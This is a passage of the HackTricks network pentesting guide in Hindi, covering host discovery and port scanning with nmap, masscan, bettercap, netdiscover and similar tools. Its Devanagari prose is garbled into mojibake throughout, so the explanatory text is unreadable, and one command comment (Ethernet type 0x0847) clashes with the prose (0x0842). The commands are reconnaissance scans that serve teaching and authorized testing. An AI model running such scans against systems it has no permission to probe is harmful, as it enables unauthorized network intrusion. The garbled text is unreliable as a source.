# рдиреЗрдЯрд╡рд░реНрдХ рдкреЗрдВрдЯреЗрд╕реНрдЯрд┐рдВрдЧ

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреА рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFT**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ рдореБрдЭреЗ **Twitter** [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)** рдХрд╛ рдкрд╛рд▓рди рдХрд░реЗрдВ**.
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рдХреЛ** [**hacktricks рд░реЗрдкреЛ**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud рд░реЗрдкреЛ**](https://github.com/carlospolop/hacktricks-cloud) **рдореЗрдВ PR рдЬрдорд╛ рдХрд░рдХреЗ рдЕрдкрдиреА рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред**

</details>

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**рдмрдЧ рдмрд╛рдЙрдВрдЯреА рдЯрд┐рдк**: **Intigriti** рдореЗрдВ **рд╕рд╛рдЗрди рдЕрдк** рдХрд░реЗрдВ, рдПрдХ рдкреНрд░реАрдорд┐рдпрдо **рдмрдЧ рдмрд╛рдЙрдВрдЯреА рдкреНрд▓реЗрдЯрдлреЙрд░реНрдо рдЬреЛ рд╣реИрдХрд░реНрд╕ рджреНрд╡рд╛рд░рд╛ рдмрдирд╛рдИ рдЧрдИ рд╣реИ, рд╣реИрдХрд░реНрд╕ рдХреЗ рд▓рд┐рдП**! рдЖрдЬ рд╣реА рд╣рдорд╛рд░реЗ рд╕рд╛рде рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks), рдФрд░ **$100,000** рддрдХ рдХреА рдмрд╛рдЙрдВрдЯреА рдХрдорд╛рдирд╛ рд╢реБрд░реВ рдХрд░реЗрдВ!

{% embed url="https://go.intigriti.com/hacktricks" %}

## рдмрд╛рд╣рд░ рд╕реЗ рд╣реЛрд╕реНрдЯ рдХреА рдЦреЛрдЬ

рдпрд╣ рдПрдХ **рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ рдЕрдиреБрднрд╛рдЧ** рд╣реЛрдЧрд╛ рдЬрд┐рд╕рдореЗрдВ рдмрддрд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдХрд┐ рдЗрдВрдЯрд░рдиреЗрдЯ рд╕реЗ **рдХреМрди рд╕реЗ IP рдкрддреЗ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рджреЗ рд░рд╣реЗ рд╣реИрдВ** рдХреИрд╕реЗ рдЦреЛрдЬреЗрдВред\
рдЗрд╕ рд╕реНрдерд┐рддрд┐ рдореЗрдВ рдЖрдкрдХреЗ рдкрд╛рд╕ рдХреБрдЫ **IP рдкрддреЗ рдХреА рд╕реАрдорд╛** рд╣реЛрддреА рд╣реИ (рд╢рд╛рдпрдж рдХрдИ **рд░реЗрдВрдЬ** рднреА) рдФрд░ рдЖрдкрдХреЛ рдмрд╕ рдпрд╣ рдЦреЛрдЬрдирд╛ рд╣реИ рдХрд┐ **рдХреМрди рд╕реЗ IP рдкрддреЗ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рджреЗ рд░рд╣реЗ рд╣реИрдВ**ред

### ICMP

рдпрд╣ рд╣реЛрд╕реНрдЯ рдЪрд╛рд▓реВ рд╣реИ рдпрд╛ рдирд╣реАрдВ рдЗрд╕реЗ рдЦреЛрдЬрдиреЗ рдХрд╛ рд╕рдмрд╕реЗ **рдЖрд╕рд╛рди** рдФрд░ **рддреЗрдЬрд╝** рддрд░реАрдХрд╛ рд╣реИред\
рдЖрдк рдХреБрдЫ **ICMP** рдкреИрдХреЗрдЯ рднреЗрдЬрдиреЗ рдФрд░ **рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреА рдЙрдореНрдореАрдж** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рд╕рдмрд╕реЗ рдЖрд╕рд╛рди рддрд░реАрдХрд╛ рдПрдХ **рдЗрдХреЛ рдЕрдиреБрд░реЛрдз** рднреЗрдЬрдирд╛ рд╣реИ рдФрд░ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреА рдЙрдореНрдореАрдж рдХрд░рдирд╛ рд╣реИред рдЖрдк рдЗрд╕реЗ рдПрдХ рд╕рд╛рдзрд╛рд░рдг `ping` рдпрд╛ **рд░реЗрдВрдЬ** рдХреЗ рд▓рд┐рдП `fping` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред\
рдЖрдк рдЕрдиреНрдп рдкреНрд░рдХрд╛рд░ рдХреЗ ICMP рдкреИрдХреЗрдЯ рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП **nmap** рднреА рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рдпрд╣ рд╕рд╛рдорд╛рдиреНрдп ICMP рдЗрдХреЛ рдЕрдиреБрд░реЛрдз-рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЗ рд▓рд┐рдП рдлрд╝рд┐рд▓реНрдЯрд░ рдХреЛ рдЯрд╛рд▓реЗрдЧрд╛)ред
```bash
ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PE -PM -PP -sn -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
```
### TCP рдкреЛрд░реНрдЯ рдЦреЛрдЬ

рдмрд╣реБрдд рд╕рд╛рдорд╛рдиреНрдп рд╣реИ рдХрд┐ рд╕рднреА рдкреНрд░рдХрд╛рд░ рдХреЗ ICMP рдкреИрдХреЗрдЯреНрд╕ рдлрд╝рд┐рд▓реНрдЯрд░ рдХрд┐рдП рдЬрд╛ рд░рд╣реЗ рд╣реИрдВред рдлрд┐рд░, рдЖрдк рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдПрдХ рд╣реЛрд╕реНрдЯ рдКрдкрд░ рд╣реИ рдпрд╛ рдирд╣реАрдВ рдЬрд╛рдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП **рдЦреБрд▓реЗ рдкреЛрд░реНрдЯреНрд╕ рдвреВрдВрдврд╝рдиреЗ** рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдВред рдкреНрд░рддреНрдпреЗрдХ рд╣реЛрд╕реНрдЯ рдореЗрдВ **65535 рдкреЛрд░реНрдЯреНрд╕** рд╣реЛрддреЗ рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП, рдЕрдЧрд░ рдЖрдкрдХреЗ рдкрд╛рд╕ рдПрдХ "рдмрдбрд╝реА" рд╕реНрдХреЛрдк рд╣реИ рддреЛ рдЖрдк рдирд╣реАрдВ рдЬрд╛рдВрдЪ рд╕рдХрддреЗ рдХрд┐ рдкреНрд░рддреНрдпреЗрдХ рд╣реЛрд╕реНрдЯ рдХрд╛ рдкреНрд░рддреНрдпреЗрдХ рдкреЛрд░реНрдЯ рдЦреБрд▓рд╛ рд╣реИ рдпрд╛ рдирд╣реАрдВ, рдпрд╣ рдмрд╣реБрдд рд╕рдордп рд▓рдЧреЗрдЧрд╛ред\
рдлрд┐рд░, рдЖрдкрдХреЛ рдПрдХ **рддреЗрдЬрд╝ рдкреЛрд░реНрдЯ рд╕реНрдХреИрдирд░** ([masscan](https://github.com/robertdavidgraham/masscan)) рдФрд░ рдПрдХ рд╕реВрдЪреА рдХреА **рдЕрдзрд┐рдХ рдкреНрд░рдпреЛрдЧ рд╣реЛрдиреЗ рд╡рд╛рд▓реЗ рдкреЛрд░реНрдЯреНрд╕** рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреА:
```bash
#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```
рдЖрдк рдЗрд╕ рдХрджрдо рдХреЛ `nmap` рдХреЗ рд╕рд╛рде рднреА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рд▓реЗрдХрд┐рди рдпрд╣ рдзреАрдорд╛ рд╣реЛрддрд╛ рд╣реИ рдФрд░ рдХреБрдЫ рд╕рдорд╕реНрдпрд╛рдПрдВ рд╣реЛ рд╕рдХрддреА рд╣реИрдВ рдЬрдм `nmap` рд╣реЛрд╕реНрдЯ рдХреА рдкрд╣рдЪрд╛рди рдХрд░рдиреЗ рдореЗрдВ рд╕рдорд╕реНрдпрд╛ рд╣реЛрддреА рд╣реИрдВред

### HTTP рдкреЛрд░реНрдЯ рдЦреЛрдЬ

рдпрд╣ рдПрдХ TCP рдкреЛрд░реНрдЯ рдЦреЛрдЬ рд╣реИ рдЬреЛ рдЬрдм рдЖрдк **HTTP рд╕реЗрд╡рд╛рдУрдВ рдХреА рдЦреЛрдЬ рдкрд░ рдзреНрдпрд╛рди рдХреЗрдВрджреНрд░рд┐рдд рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ рдЙрдкрдпреЛрдЧреА рд╣реЛрддреА рд╣реИ:
```bash
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```
### UDP рдкреЛрд░реНрдЯ рдЦреЛрдЬ

рдЖрдк рдПрдХ **UDP рдкреЛрд░реНрдЯ рдЦреЛрд▓реЗ** рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдЖрдкрдХреЛ рдПрдХ **рд╣реЛрд╕реНрдЯ** рдкрд░ **рдЕрдзрд┐рдХ рдзреНрдпрд╛рди рджреЗрдиреЗ** рдХреА рдЬрд░реВрд░рдд рд╣реЛред UDP рд╕реЗрд╡рд╛рдПрдВ рдЖрдорддреМрд░ рдкрд░ **рдХрд┐рд╕реА рднреА рдбреЗрдЯрд╛** рдХреЗ рд╕рд╛рде рдПрдХ рдирд┐рдпрдорд┐рдд рдЦрд╛рд▓реА UDP рдкреНрд░реЛрдм рдкреИрдХреЗрдЯ рдХрд╛ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдирд╣реАрдВ рдХрд░рддреА рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП рдпрд╣ рдХрдард┐рди рд╣реЛрддрд╛ рд╣реИ рдХрд┐ рдХреНрдпрд╛ рдкреЛрд░реНрдЯ рдлрд╝рд┐рд▓реНрдЯрд░ рд╣реЛ рд░рд╣рд╛ рд╣реИ рдпрд╛ рдЦреБрд▓рд╛ рд╣реИред рдЗрд╕реЗ рддрдп рдХрд░рдиреЗ рдХрд╛ рд╕рдмрд╕реЗ рдЖрд╕рд╛рди рддрд░реАрдХрд╛ рд╣реИ рдХрд┐ рдЖрдк рдЪрд▓ рд░рд╣реА рд╕реЗрд╡рд╛ рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рдПрдХ рдкреИрдХреЗрдЯ рднреЗрдЬреЗрдВ, рдФрд░ рдХреНрдпреЛрдВрдХрд┐ рдЖрдкрдХреЛ рдпрд╣ рдирд╣реАрдВ рдкрддрд╛ рд╣реИ рдХрд┐ рдХреМрди рд╕реА рд╕реЗрд╡рд╛ рдЪрд▓ рд░рд╣реА рд╣реИ, рдЗрд╕рд▓рд┐рдП рдЖрдкрдХреЛ рдкреЛрд░реНрдЯ рдирдВрдмрд░ рдкрд░ рдЖрдзрд╛рд░рд┐рдд рд╕рдмрд╕реЗ рд╕рдВрднрд╛рд╡рд┐рдд рдХреЛрд╢рд┐рд╢ рдХрд░рдиреА рдЪрд╛рд╣рд┐рдП:
```bash
nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
```
рдкрд╣рд▓реЗ рдкреНрд░рд╕реНрддрд╛рд╡рд┐рдд nmap рд▓рд╛рдЗрди рд╣рд░ рд╣реЛрд╕реНрдЯ рдХреЗ рднреАрддрд░ **/24** рд░реЗрдВрдЬ рдореЗрдВ **рд╢реАрд░реНрд╖ 1000 UDP рдкреЛрд░реНрдЯ** рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдЧреА, рд▓реЗрдХрд┐рди рдпрд╣ рднреА рдХреЗрд╡рд▓ **>20 рдорд┐рдирдЯ** рд▓рдЧреЗрдЧрд╛ред рдпрджрд┐ рдЖрдкрдХреЛ **рддреЗрдЬрд╝ рдирддреАрдЬреЗ** рдЪрд╛рд╣рд┐рдП рддреЛ рдЖрдк [**udp-proto-scanner**](https://github.com/portcullislabs/udp-proto-scanner) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ: `./udp-proto-scanner.pl 199.66.11.53/24` рдЗрд╕рд╕реЗ рдпреЗ **UDP рдкреНрд░реЛрдмреНрд╕** рдЙрдирдХреЗ **рдЕрдкреЗрдХреНрд╖рд┐рдд рдкреЛрд░реНрдЯ** рдкрд░ рднреЗрдЬреЗрдЧрд╛ (рдПрдХ /24 рд░реЗрдВрдЬ рдХреЗ рд▓рд┐рдП рдпрд╣ рдХреЗрд╡рд▓ 1 рдорд┐рдирдЯ рд▓рдЧреЗрдЧрд╛): _DNSStatusRequest, DNSVersionBindReq, NBTStat, NTPRequest, RPCCheck, SNMPv3GetRequest, chargen, citrix, daytime, db2, echo, gtpv1, ike,ms-sql, ms-sql-slam, netop, ntp, rpc, snmp-public, systat, tftp, time, xdmcp._

### SCTP рдкреЛрд░реНрдЯ рдЦреЛрдЬ
```bash
#Probably useless, but it's pretty fast, why not trying?
nmap -T4 -sY -n --open -Pn <IP/range>
```
## Wifi рдкреЗрдВрдЯреЗрд╕реНрдЯрд┐рдВрдЧ

рдпрд╣рд╛рдВ рдЖрдкрдХреЛ рд▓рд┐рдЦрдиреЗ рдХреЗ рд╕рдордп рд╕рднреА рдЕрдЪреНрдЫреА рддрд░рд╣ рд╕реЗ рдЬрд╛рдиреЗ рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ Wifi рд╣рдорд▓реЛрдВ рдХреЗ рдПрдХ рдЕрдЪреНрдЫреЗ рдЧрд╛рдЗрдб рдорд┐рд▓реЗрдЧрд╛:

{% content-ref url="../pentesting-wifi/" %}
[pentesting-wifi](../pentesting-wifi/)
{% endcontent-ref %}

## рдЕрдВрджрд░ рд╕реЗ рд╣реЛрд╕реНрдЯ рдХреА рдЦреЛрдЬ

рдпрджрд┐ рдЖрдк рдиреЗрдЯрд╡рд░реНрдХ рдХреЗ рдЕрдВрджрд░ рд╣реИрдВ, рддреЛ рдЖрдкрдХреЛ рд╕рдмрд╕реЗ рдкрд╣рд▓реЗ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП рд╣реЛрд╕реНрдЯ рдХреА рдЦреЛрдЬ рдХрд░рдирд╛ рд╣реИ. рдЖрдкрдХреЗ рдкрд╛рд╕ рдХрд┐рддрдиреА рд╢реЛрд░ рдордЪрд╛ рд╕рдХрддреА рд╣реИ, рдЗрд╕ рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддрд╛ рд╣реИ, рд╡рд┐рднрд┐рдиреНрди рдХрд╛рд░реНрд░рд╡рд╛рдИ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИ:

### рдирд┐рд╖реНрдХреНрд░рд┐рдп

рдЖрдк рдЗрди рдЙрдкрдХрд░рдгреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХреНрдЯрд┐рд╡ рдиреЗрдЯрд╡рд░реНрдХ рдХреЗ рдЕрдВрджрд░ рд╣реЛрд╕реНрдЯ рдХреА рдЦреЛрдЬ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```
### рд╕рдХреНрд░рд┐рдп

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ [_**рдмрд╛рд╣рд░ рд╕реЗ рд╣реЛрд╕реНрдЯ рдЦреЛрдЬрдирд╛**_](./#discovering-hosts-from-the-outside) (_TCP/HTTP/UDP/SCTP рдкреЛрд░реНрдЯ рдЦреЛрдЬ_) рдореЗрдВ рдЯрд┐рдкреНрдкрдгреА рдХреА рдЧрдИ рддрдХрдиреАрдХреЛрдВ рдХреЛ рдпрд╣рд╛рдВ рднреА **рд▓рд╛рдЧреВ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ**ред\
рд▓реЗрдХрд┐рди, рдЬреИрд╕рд╛ рдХрд┐ рдЖрдк **рджреВрд╕рд░реЗ рд╣реЛрд╕реНрдЯреНрд╕ рдХреЗ рд╕рд╛рдереА рдиреЗрдЯрд╡рд░реНрдХ рдореЗрдВ** рд╣реИрдВ, рдЖрдк **рдЕрдзрд┐рдХ рдХрд╛рд░реНрдп** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
#ARP discovery
nmap -sn <Network> #ARP Requests (Discover IPs)
netdiscover -r <Network> #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 <IFACE> # Send a pingv6 to multicast.
```
### рд╕рдХреНрд░рд┐рдп ICMP

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ _рдмрд╛рд╣рд░ рд╕реЗ рд╣реЛрд╕реНрдЯ рдХреА рдЦреЛрдЬ_ рдореЗрдВ рдЯрд┐рдкреНрдкрдгреА рдХреА рдЧрдИ рддрдХрдиреАрдХреЗрдВ ([_**ICMP**_](./#icmp)) рдпрд╣рд╛рдВ рднреА **рд▓рд╛рдЧреВ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИрдВ**ред\
рд▓реЗрдХрд┐рди, рдЬреИрд╕рд╛ рдХрд┐ рдЖрдк **рдПрдХ рд╣реА рдиреЗрдЯрд╡рд░реНрдХ** рдореЗрдВ рд╣реЛрд╕реНрдЯреЛрдВ рдХреЗ рд╕рд╛рде рд╣реИрдВ, рдЖрдк **рдЕрдзрд┐рдХ рдХрд╛рд░реНрдп** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

* рдпрджрд┐ рдЖрдк **рд╕рдмрдиреЗрдЯ рдмреНрд░реЙрдбрдХрд╛рд╕реНрдЯ рдкрддреЗ** рдкрд░ **рдкрд┐рдВрдЧ** рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рдкрд┐рдВрдЧ **рдкреНрд░рддреНрдпреЗрдХ рд╣реЛрд╕реНрдЯ** рддрдХ рдкрд╣реБрдВрдЪрдирд╛ рдЪрд╛рд╣рд┐рдП рдФрд░ рд╡реЗ рдЖрдкрдХреЛ **рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛** рджреЗ рд╕рдХрддреЗ рд╣реИрдВ: `ping -b 10.10.5.255`
* рдиреЗрдЯрд╡рд░реНрдХ рдмреНрд░реЙрдбрдХрд╛рд╕реНрдЯ рдкрддреЗ рдкрд░ рдкрд┐рдВрдЧ рдХрд░рдХреЗ рдЖрдк **рдЕрдиреНрдп рд╕рдмрдиреЗрдЯреНрд╕ рдореЗрдВ рд╣реЛрд╕реНрдЯ** рднреА рдЦреЛрдЬ рд╕рдХрддреЗ рд╣реИрдВ: `ping -b 255.255.255.255`
* `nmap` рдХреЗ `-PE`, `-PP`, `-PM` рдлреНрд▓реИрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╣реЛрд╕реНрдЯ рдЦреЛрдЬ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **ICMPv4 echo**, **рдЯрд╛рдЗрдорд╕реНрдЯреИрдореНрдк**, рдФрд░ **рд╕рдмрдиреЗрдЯ рдорд╛рд╕реНрдХ рдЕрдиреБрд░реЛрдз** рднреЗрдЬреЗрдВ: `nmap -PE -PM -PP -sn -vvv -n 10.12.5.0/24`

### **Wake On Lan**

Wake On Lan рдХрд╛ рдЙрдкрдпреЛрдЧ **рдиреЗрдЯрд╡рд░реНрдХ рд╕рдВрджреЗрд╢** рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХрдВрдкреНрдпреВрдЯрд░ рдХреЛ **рдЪрд╛рд▓реВ рдХрд░рдиреЗ** рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдХрдВрдкреНрдпреВрдЯрд░ рдХреЛ рдЪрд╛рд▓реВ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдореИрдЬрд┐рдХ рдкреИрдХреЗрдЯ рдореЗрдВ рдХреЗрд╡рд▓ рдПрдХ **MAC Dst** рдкреИрдХреЗрдЯ рдореЗрдВ рдкреНрд░рджрд╛рди рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдлрд┐рд░ рдЗрд╕реЗ **16 рдмрд╛рд░ рджреЛрд╣рд░рд╛рдпрд╛** рдЬрд╛рддрд╛ рд╣реИред\
рдлрд┐рд░ рдЗрд╕ рддрд░рд╣ рдХреЗ рдкреИрдХреЗрдЯреНрд╕ рдЖрдорддреМрд░ рдкрд░ рдПрдХ **рдЗрдерд░рдиреЗрдЯ 0x0842** рдпрд╛ **рдкреЛрд░реНрдЯ 9 рдкрд░ UDP рдкреИрдХреЗрдЯ** рдореЗрдВ рднреЗрдЬреЗ рдЬрд╛рддреЗ рд╣реИрдВред\
рдпрджрд┐ **рдХреЛрдИ \[MAC]** рдкреНрд░рджрд╛рди рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рддреЛ рдкреИрдХреЗрдЯ **рдмреНрд░реЙрдбрдХрд╛рд╕реНрдЯ рдЗрдерд░рдиреЗрдЯ** рдкрд░ рднреЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИ (рдФрд░ рдмреНрд░реЙрдбрдХрд╛рд╕реНрдЯ MAC рджреЛрд╣рд░рд╛рдпрд╛ рдЬрд╛рдиреЗ рд╡рд╛рд▓рд╛ рд╣реЛрдЧрд╛)ред
```bash
# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0847
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
```
## рд╣реЛрд╕реНрдЯреЛрдВ рдХреА рд╕реНрдХреИрдирд┐рдВрдЧ

рдЬрдм рдЖрдкрдиреЗ рд╕рднреА рдЖрдИрдкреА (рдмрд╛рд╣рд░реА рдпрд╛ рдЖрдВрддрд░рд┐рдХ) рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдпрд╛ рд╣реИ рдЬрд┐рдиреНрд╣реЗрдВ рдЖрдк рдЧрд╣рд░рд╛рдИ рд╕реЗ рд╕реНрдХреИрди рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ, рддреЛ рд╡рд┐рднрд┐рдиреНрди рдХрд╛рд░реНрд░рд╡рд╛рдЗрдпрд╛рдБ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИрдВред

### TCP

* **рдЦреБрд▓рд╛** рдкреЛрд░реНрдЯ: _SYN --> SYN/ACK --> RST_
* **рдмрдВрдж** рдкреЛрд░реНрдЯ: _SYN --> RST/ACK_
* **рдлрд╝рд┐рд▓реНрдЯрд░** рдХрд┐рдпрд╛ рдЧрдпрд╛ рдкреЛрд░реНрдЯ: _SYN --> \[рдХреЛрдИ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдирд╣реАрдВ]_
* **рдлрд╝рд┐рд▓реНрдЯрд░** рдХрд┐рдпрд╛ рдЧрдпрд╛ рдкреЛрд░реНрдЯ: _SYN --> ICMP рд╕рдВрджреЗрд╢_
```bash
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP>
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP>
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```
### UDP

рдПрдХ UDP рдкреЛрд░реНрдЯ рд╕реНрдХреИрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП 2 рд╡рд┐рдХрд▓реНрдк рд╣реИрдВ:

* рдПрдХ **UDP рдкреИрдХреЗрдЯ** рднреЗрдЬреЗрдВ рдФрд░ рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдкреЛрд░реНрдЯ **рдмрдВрдж** рд╣реИ рддреЛ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ _**ICMP unreachable**_ рдорд┐рд▓рддреА рд╣реИ (рдХрдИ рдорд╛рдорд▓реЛрдВ рдореЗрдВ ICMP **рдлрд╝рд┐рд▓реНрдЯрд░** рд╣реЛ рдЬрд╛рдПрдЧрд╛, рдЗрд╕рд▓рд┐рдП рдЖрдкрдХреЛ рдХреЛрдИ рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рд╛рдкреНрдд рдирд╣реАрдВ рд╣реЛрдЧреА рдХрд┐ рдкреЛрд░реНрдЯ рдмрдВрдж рд╣реИ рдпрд╛ рдЦреБрд▓рд╛ рд╣реИ)ред
